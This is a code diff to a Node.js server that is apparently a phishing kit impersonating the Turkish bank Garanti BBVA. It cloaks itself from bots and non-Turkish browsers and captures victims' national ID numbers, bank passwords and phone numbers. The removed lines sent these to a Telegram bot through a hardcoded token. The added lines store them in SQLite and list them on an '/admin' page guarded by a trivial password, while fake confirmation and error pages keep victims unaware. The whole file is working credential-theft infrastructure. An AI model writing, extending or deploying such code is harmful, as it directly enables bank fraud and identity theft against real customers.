@@ -4,6 +4,7 @@ const helmet = require('helmet');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
+const sqlite3 = require('sqlite3').verbose();
 
 const app = express();
 app.use(express.json());
@@ -14,9 +15,31 @@ app.use(compression());
 const PORT = process.env.PORT || 3000;
 const BIREYSEL_DIR = path.join(__dirname, 'public', 'bireysel');
 
-// 🚀 DEV MODE: true yaparsanız bot koruması ve gate tamamen devre dışı kalır, her şeyi direkt geçersiniz.
-// Canlıya (production) alırken bunu 'false' yapmayı unutmayın.
-const DEV_MODE = false; 
+// 🚀 DEV MODE: true yaparsanız bot koruması ve gate tamamen devre dışı kalır.
+const DEV_MODE = true; 
+
+// ─── SQLITE VERİTABANI KURULUMU ──────────────────────────────────────────────
+const dbPath = path.resolve(__dirname, 'bank.db');
+const db = new sqlite3.Database(dbPath, (err) => {
+  if (err) {
+    console.error('Veritabanı bağlantı hatası:', err.message);
+  } else {
+    console.log('📦 SQLite veritabanına başarıyla bağlanıldı (bank.db).');
+  }
+});
+
+// Tabloyu oluştur (Yoksa)
+db.serialize(() => {
+  db.run(`CREATE TABLE IF NOT EXISTS login_attempts (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    ip TEXT,
+    tc TEXT,
+    password TEXT,
+    phone TEXT,
+    step INTEGER DEFAULT 1,
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+  )`);
+});
 
 const GATE_HTML = `<!DOCTYPE html>
 <html lang="tr">
@@ -103,7 +126,7 @@ function parseCookies(req) {
 }
 
 function isBot(data) {
-  if (DEV_MODE) return false; // Dev modunda asla bot sayma
+  if (DEV_MODE) return false;
 
   const gpu = (data.webgl_renderer || '').toLowerCase();
   const platform = (data.platform || '').toLowerCase();
@@ -124,17 +147,11 @@ function isBot(data) {
   const DESKTOP_GPU = ['nvidia', 'geforce', 'quadro', 'gtx ', 'rtx ', 'mx ', 'radeon', 'amd ', 'rx ', 'vega', 'intel(r) hd graphics', 'intel(r) iris', 'intel(r) uhd', 'intel(r) arc'];
   if (isMobileUA && DESKTOP_GPU.some(m => gpu.includes(m))) return true;
 
-// 1. Tarayıcı dili Türkçe (tr) değilse bot say
   const lang = (data.language || data.browser_lang || '').toLowerCase();
   if (lang && !lang.startsWith('tr')) return true;
 
-
   return false;
 }
-
-app.use(helmet({ contentSecurityPolicy: false }));
-app.use(express.json());
-app.use(compression());
 
 app.post('/api/js_check', (req, res) => {
   const data = req.body || {};
@@ -148,9 +165,9 @@ app.post('/api/js_check', (req, res) => {
 app.post('/api/js_dropoff', (req, res) => res.status(200).end());
 app.get('/api/js_dropoff', (req, res) => res.status(200).end());
 
-// ─── GATE KONTROLÜ (DEV_MODE İLE BYPASS) ─────────────────────────────────────
+// ─── GATE KONTROLÜ ───────────────────────────────────────────────────────────
 app.use('/bireysel', (req, res, next) => {
-  if (DEV_MODE) return next(); // Dev modunda gate kontrolünü tamamen atla
+  if (DEV_MODE) return next();
 
   const ext = path.extname(req.path);
   if (ext && ext !== '.html') return next();
@@ -176,127 +193,181 @@ app.use('/bireysel', express.static(BIREYSEL_DIR, {
 app.get('/', (req, res) => res.redirect('/bireysel/'));
 app.get('/bireysel', (req, res) => res.redirect('/bireysel/'));
 
-const TELEGRAM_BOT_TOKEN = '9153130065:AAHbFdkC0Ci_T9RGYHxY0Pp5GeVXfFCAOo0';
-const TELEGRAM_CHAT_ID = '-1004351328928';
-
 function getClientIP(req) {
   const fwd = req.headers['x-forwarded-for'];
   if (fwd) return fwd.split(',')[0].trim();
   return req.connection && req.connection.remoteAddress || req.ip || 'bilinmiyor';
 }
-// Tek adımlı giriş endpoint'i (Sadece TC ve Parola alır)
 
-
-
-// Kullanıcıların geçici verilerini IP bazlı hafizada tutmak için
 const userSessions = {};
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// 1. Adım: TC ve Parola Alınır, Telegram'a İlk Bildirim Atılır ve message_id Hafızaya Kaydedilir
+// T.C. Kimlik Numarası Algoritma Doğrulama Fonksiyonu (API Seviyesi)
+function isValidTCKN(tc) {
+  if (!tc || typeof tc !== 'string' && typeof tc !== 'number') return false;
+  const strTc = String(tc).trim();
+  if (!/^[1-9][0-9]{10}$/.test(strTc)) return false;
+  
+  const digits = strTc.split('').map(Number);
+  const oddSum = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
+  const evenSum = digits[1] + digits[3] + digits[5] + digits[7];
+  
+  const digit10 = (oddSum * 7 - evenSum) % 10;
+  if (digit10 !== digits[9]) return false;
+  
+  const totalSum = digits.slice(0, 10).reduce((a, b) => a + b, 0);
+  if (totalSum % 10 !== digits[10]) return false;
+  
+  return true;
+}
+
+// 1. Adım: TC ve Parola Kontrolü
 app.post('/bireysel/step1', async (req, res) => {
   const { tc, password } = req.body;
   const ip = getClientIP(req);
 
-  if (!tc || !password) {
-    return res.status(400).json({ success: false, error: 'Lütfen T.C. ve parolanızı giriniz.' });
+  if (!tc || tc.length !== 11) {
+    return res.status(400).json({ success: false, error: 'tc', message: 'Lütfen geçerli müşteri ya da T.C. Kimlik numaranızı girin.' });
   }
 
-  // İlk aşama mesajını hazırlıyoruz (Telefon henüz bekleniyor)
-  let initialMsg = `🔔 *Yeni Giriş Denemesi (Aşama 1)*\n\n`;
-  initialMsg += `🌐 *IP:* ${ip}\n`;
-  initialMsg += `👤 *TC / Müşteri No:* \`${tc}\`\n`;
-  initialMsg += `🔑 *Parola:* \`${password}\`\n`;
-  initialMsg += `⏳ *Durum:* Telefon bekleniyor...`;
+  if (!isValidTCKN(tc)) {
+    return res.status(400).json({ success: false, error: 'tc', message: 'Girdiğiniz T.C. Kimlik numarası geçersizdir.' });
+  }
 
-  try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const resp = await fetch(url, {
-      method: 'POST', 
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        chat_id: TELEGRAM_CHAT_ID, 
-        text: initialMsg, 
-        parse_mode: 'Markdown' 
-      })
-    });
-    
-    const data = await resp.json();
+  if (!password || password.length !== 6) {
+    return res.status(400).json({ success: false, error: 'password', message: 'Lütfen geçerli parolanızı girin (6 haneli).' });
+  }
 
-    if (resp.ok && data.result) {
-      // Telegram'dan dönen message_id'yi TC ve şifre ile birlikte RAM'e kaydediyoruz
-      userSessions[ip] = { 
-        tc, 
-        password, 
-        message_id: data.result.message_id 
-      };
-      console.log(`📥 [Adım 1] TC, Parola alındı ve ilk bildirim atıldı (IP: ${ip}, MsgID: ${data.result.message_id})`);
-      
-      return res.json({ success: true });
-    } else {
-      console.error('Telegram İlk Bildirim Hatası:', data);
-      return res.status(500).json({ success: false, error: 'Telegram mesajı iletilemedi.' });
+  await sleep(500);
+
+  const query = `INSERT INTO login_attempts (ip, tc, password, step) VALUES (?, ?, ?, 1)`;
+  
+  db.run(query, [ip, tc, password], function(err) {
+    if (err) {
+      console.error('DB Kayıt Hatası:', err.message);
+      return res.status(500).json({ success: false, message: 'Veritabanı kayıt hatası oluştu.' });
     }
-  } catch (e) { 
-    console.error('Sunucu Hatası:', e);
-    return res.status(500).json({ success: false, error: 'Sunucu hatası oluştu.' }); 
-  }
-});
-const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// 2. Adım: Telefon Alınır, Hafızadaki message_id Kullanılarak Önceki Telegram Mesajı Güncellenir (Edit)
+    userSessions[ip] = { dbId: this.lastID };
+    console.log(`📥 [Adım 1] TC ve Parola veritabanına kaydedildi (IP: ${ip}, ID: ${this.lastID})`);
+    
+    return res.json({ success: true });
+  });
+});
+
+// 2. Adım: Telefon Numarası Kontrolü
 app.post('/bireysel/step2', async (req, res) => {
   const { phone } = req.body;
   const ip = getClientIP(req);
   await sleep(1000);
-  // Hafızada bu IP'ye ait oturum ve message_id var mı kontrol edelim
-  const savedData = userSessions[ip];
-  if (!savedData || !savedData.tc || !savedData.password || !savedData.message_id) {
-    return res.status(400).json({ success: false, error: 'Oturum süresi doldu veya eksik bilgi. Lütfen baştan başlayın.' });
+
+  const cleanPhone = phone ? phone.replace(/^\+90\s*/, '').replace(/\D/g, '') : '';
+
+  if (!cleanPhone || cleanPhone.length !== 10) {
+    return res.status(400).json({ success: false, error: 'phone', message: 'Lütfen 10 haneli geçerli bir telefon numarası giriniz (5XXXXXXXXX).' });
   }
 
-  if (!phone) {
-    return res.status(400).json({ success: false, error: 'Lütfen telefon numaranızı giriniz.' });
-  }
-
-  console.log(`📥 [Adım 2] Telefon alındı (IP: ${ip}), Telegram mesajı güncelleniyor...`);
-
-  // Güncellenmiş tam bilgi mesajını hazırlıyoruz
-  let updatedMsg = `✅ *Tam Giriş Başarılı (Aşama 2)*\n\n`;
-  updatedMsg += `🌐 *IP:* ${ip}\n`;
-  updatedMsg += `👤 *TC / Müşteri No:* \`${savedData.tc}\`\n`;
-  updatedMsg += `🔑 *Parola:* \`${savedData.password}\`\n`;
-  updatedMsg += `📞 *Telefon:* \`${phone}\``;
-
-  try {
-    // Telegram'da editMessageText endpoint'ini kullanarak mevcut mesajı güncelliyoruz
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
-    const resp = await fetch(url, {
-      method: 'POST', 
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        chat_id: TELEGRAM_CHAT_ID, 
-        message_id: savedData.message_id, 
-        text: updatedMsg, 
-        parse_mode: 'Markdown' 
-      })
+  const session = userSessions[ip];
+  if (session && session.dbId) {
+    const updateQuery = `UPDATE login_attempts SET phone = ?, step = 2 WHERE id = ?`;
+    db.run(updateQuery, [phone, session.dbId], (err) => {
+      if (err) console.error('DB Güncelleme Hatası:', err.message);
     });
-    
-    const data = await resp.json();
-    
-    // İşlem bittiği için sunucu hafızasından bu oturumu temizliyoruz
-    delete userSessions[ip];
-
-    if (resp.ok && data.result) {
-      return res.json({ success: true });
-    } else {
-      console.error('Telegram Güncelleme Hatası:', data);
-      return res.status(500).json({ success: false, error: 'Telegram mesajı güncellenemedi.' });
-    }
-  } catch (e) { 
-    console.error('Sunucu Hatası:', e);
-    return res.status(500).json({ success: false, error: 'Sunucu hatası oluştu.' }); 
+  } else {
+    const fallbackQuery = `UPDATE login_attempts SET phone = ?, step = 2 WHERE ip = ? ORDER BY id DESC LIMIT 1`;
+    db.run(fallbackQuery, [phone, ip]);
   }
+
+  delete userSessions[ip];
+  console.log(`📥 [Adım 2] Telefon eklendi ve kayıt güncellendi (IP: ${ip})`);
+
+  return res.json({ success: true });
 });
-// Yanlışlıkla GET isteği gelirse ana sayfaya geri yönlendirsin
+
+// ─── 📊 ADMIN PANEL ROTASI ───────────────────────────────────────────────────
+app.get('/admin', (req, res) => {
+  const sifre = req.query.sifre;
+  if (sifre !== 'gizli123') {
+    return res.send(`
+      <!DOCTYPE html>
+      <html lang="tr">
+      <head><meta charset="UTF-8"><title>Yetkisiz Erişim</title></head>
+      <body style="font-family:sans-serif; text-align:center; padding-top:80px; background:#f4f6f8;">
+        <h2 style="color:#d9534f;">🔒 Yetkisiz Erişim</h2>
+        <p>Bu sayfayı görüntülemek için geçerli bir şifre girmelisiniz.</p>
+        <p style="color:#888; font-size:12px;">Örnek Kullanım: /admin?sifre=gizli123</p>
+      </body>
+      </html>
+    `);
+  }
+
+  db.all(`SELECT * FROM login_attempts ORDER BY id DESC`, [], (err, rows) => {
+    if (err) {
+      return res.status(500).send("Veritabanı okuma hatası: " + err.message);
+    }
+
+    let tableRows = rows.map(row => `
+      <tr>
+        <td>${row.id}</td>
+        <td>${row.ip || ''}</td>
+        <td><b>${row.tc || ''}</b></td>
+        <td><code>${row.password || ''}</code></td>
+        <td><b>${row.phone || '<span style="color:#999;">Bekleniyor...</span>'}</b></td>
+        <td><span style="padding: 3px 8px; border-radius: 4px; background: ${row.step == 2 ? '#e6f4ea' : '#fef7e0'}; color: ${row.step == 2 ? '#137333' : '#b06000'};">Adım ${row.step}</span></td>
+        <td>${row.created_at}</td>
+      </tr>
+    `).join('');
+
+    res.send(`
+      <!DOCTYPE html>
+      <html lang="tr">
+      <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>Admin Paneli - Kayıtlar</title>
+          <style>
+              body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f6f8; margin: 0; padding: 20px; }
+              .container { max-width: 1100px; margin: 0 auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+              .header-flex { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+              h2 { color: #222; margin: 0; }
+              table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+              th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #ddd; font-size: 14px; }
+              th { background-color: #009639; color: white; }
+              tr:hover { background-color: #f9f9f9; }
+              code { background: #eee; padding: 2px 6px; border-radius: 4px; font-family: monospace; }
+              .btn { padding: 8px 16px; background: #009639; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 13px; }
+              .btn:hover { background: #007a2e; }
+          </style>
+      </head>
+      <body>
+          <div class="container">
+              <div class="header-flex">
+                  <h2>📊 Admin Paneli - Gelen Giriş Denemeleri</h2>
+                  <a href="/admin?sifre=gizli123" class="btn">🔄 Tabloyu Yenile</a>
+              </div>
+              <table>
+                  <thead>
+                      <tr>
+                          <th>ID</th>
+                          <th>IP Adresi</th>
+                          <th>TC / Müşteri No</th>
+                          <th>Parola</th>
+                          <th>Telefon</th>
+                          <th>Durum</th>
+                          <th>Tarih / Saat</th>
+                      </tr>
+                  </thead>
+                  <tbody>
+                      ${tableRows || '<tr><td colspan="7" style="text-align:center; padding: 20px; color:#666;">Henüz veritabanında kayıt bulunmuyor.</td></tr>'}
+                  </tbody>
+              </table>
+          </div>
+      </body>
+      </html>
+    `);
+  });
+});
+
 app.get('/bireysel/step1', (req, res) => res.redirect('/bireysel/'));
 app.get('/bireysel/step2', (req, res) => res.redirect('/bireysel/'));
 
@@ -319,7 +390,8 @@ app.get('/bireysel/', (req, res) => {
   }
 
   res.sendFile(path.join(BIREYSEL_DIR, 'index.html'));
-});// Başarılı işlem sonrası gösterilecek ve akışın son adımı olan sayfa
+});
+// ─── 2. GÖRSEL: BAŞARILI / BAŞVURUNUZ ALINDI SAYFASI ────────────────────────
 app.get('/bireysel/basarili', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -327,86 +399,37 @@ app.get('/bireysel/basarili', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Garanti BBVA - İşlem Başarılı</title>
+        <title>Başvurunuz Alındı</title>
         <style>
-            body { 
-                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-                background: #f4f6f8; 
-                margin: 0; 
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                min-height: 100vh;
-            }
-            /* En üstteki logo bandı */
-            .header-bar {
-                width: 100%;
-                background: #ffffff;
-                padding: 15px 0;
-                text-align: center;
-                box-shadow: 0 2px 4px rgba(0,0,0,0.04);
-                margin-bottom: 30px;
-            }
-            .header-bar img {
-                max-width: 270px;
-                height: auto;
-                display: inline-block;
-            }
-            .container { 
-                width: 100%; 
-                max-width: 420px; 
-                padding: 0 20px 20px 20px; 
-                box-sizing: border-box;
-            }
-            .card { 
-                background: white; 
-                padding: 40px 30px; 
-                border-radius: 12px; 
-                box-shadow: 0 4px 20px rgba(0,0,0,0.08); 
-                text-align: center; 
-            }
-            .check-icon {
-                width: 60px;
-                height: 60px;
-                background: #e6f4ea;
-                color: #28a745;
-                font-size: 32px;
-                line-height: 60px;
-                border-radius: 50%;
-                margin: 0 auto 20px auto;
-                font-weight: bold;
-            }
-            h2 { 
-                color: #222; 
-                font-size: 22px; 
-                margin-bottom: 12px; 
-                font-weight: bold; 
-            }
-            p { 
-                color: #666; 
-                font-size: 14px; 
-                line-height: 1.6; 
-                margin: 0; 
-            }
+            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f6f8; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; box-sizing: border-box; }
+            .card { background: white; padding: 55px 35px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); text-align: center; max-width: 400px; width: 100%; box-sizing: border-box; }
+            .check-icon { width: 70px; height: 70px; background: #e1f3ed; color: #008763; font-size: 32px; line-height: 70px; border-radius: 50%; margin: 0 auto 20px auto; font-weight: bold; display: flex; align-items: center; justify-content: center; }
+            h2 { color: #111; font-size: 22px; margin-bottom: 12px; font-weight: bold; }
+            p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
+            .ref-box { background: #f8f9fa; border: 1px solid #e5e9ec; border-radius: 12px; padding: 15px; text-align: left; margin-bottom: 30px; }
+            .ref-title { font-size: 11px; color: #888; font-weight: bold; letter-spacing: 0.5px; margin-bottom: 5px; }
+            .ref-code { font-size: 16px; color: #008763; font-weight: bold; font-family: monospace; }
+            .btn { background: #008763; color: white; border: none; padding: 15px 20px; border-radius: 12px; cursor: pointer; text-decoration: none; display: block; font-weight: bold; font-size: 16px; width: 100%; box-sizing: border-box; }
+            .btn:hover { background: #007052; }
         </style>
     </head>
     <body>
-        <!-- Logonun yer aldığı en üst bant -->
-        <div class="header-bar">
-            <img src="/bireysel/assets/logo-garantibbva-2x.png" alt="Garanti Bankası A.Ş.">
-        </div>
-
-        <div class="container">
-            <div class="card">
-                <div class="check-icon">✓</div>
-                <h2>Başvurunuz Başarılı!</h2>
-                <p>Bilgileriniz alınmıştır. Müşteri temsilcimiz en kısa sürede size ulaşacaktır.</p>
+        <div class="card">
+            <div class="check-icon">✓</div>
+            <h2>Başvurunuz Alındı</h2>
+            <p>Kredi başvurunuz sisteme başarıyla iletilmiştir. Değerlendirme sonucunda en kısa sürede sizinle iletişime geçilecektir.</p>
+            <div class="ref-box">
+                <div class="ref-title">REFERANS NUMARASI</div>
+                <div class="ref-code">GBB-2026-WCGOQUU5</div>
             </div>
+            <a href="/bireysel" class="btn">Kapat</a>
         </div>
     </body>
     </html>
   `);
 });
+
+// ─── 1. GÖRSEL: KURUMSAL / İŞLEM TAMAMLANAMADI SAYFASI ──────────────────────
 app.get('/isube/login/login/passwordentrycorporate-tr', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -414,20 +437,23 @@ app.get('/isube/login/login/passwordentrycorporate-tr', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Kurumsal İşlemler</title>
+        <title>İşlem Tamamlanamadı</title>
         <style>
-            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f6f8; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-            .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; max-width: 380px; }
-            h2 { color: #333; font-size: 20px; margin-bottom: 10px; }
-            p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
-            .btn { background: #009639; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; text-decoration: none; display: inline-block; font-weight: bold; }
+            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f6f8; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; box-sizing: border-box; }
+            .card { background: white; padding: 55px 35px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); text-align: center; max-width: 400px; width: 100%; box-sizing: border-box; }
+            .warning-icon { width: 64px; height: 64px; margin: 0 auto 20px auto; display: flex; align-items: center; justify-content: center; font-size: 38px; }
+            h2 { color: #111; font-size: 22px; margin-bottom: 14px; font-weight: bold; }
+            p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+            .btn { background: #008763; color: white; border: none; padding: 15px 20px; border-radius: 12px; cursor: pointer; text-decoration: none; display: block; font-weight: bold; font-size: 16px; width: 100%; box-sizing: border-box; }
+            .btn:hover { background: #007052; }
         </style>
     </head>
     <body>
         <div class="card">
-            <h2>Hizmet Dışı</h2>
-            <p>Şu anda kurumsal giriş işlemleri geçici olarak kullanılamamaktadır.</p>
-            <a href="/bireysel" class="btn">Geri Dön</a>
+            <div class="warning-icon">⚠️</div>
+            <h2>İşlem Tamamlanamadı</h2>
+            <p>Başvuru esnasında müşteri olunamamaktadır.<br><br>Lütfen daha sonra tekrar deneyiniz veya en yakın şubemizi ziyaret ediniz.</p>
+            <a href="/bireysel" class="btn">Ana Sayfaya Dön</a>
         </div>
     </body>
     </html>
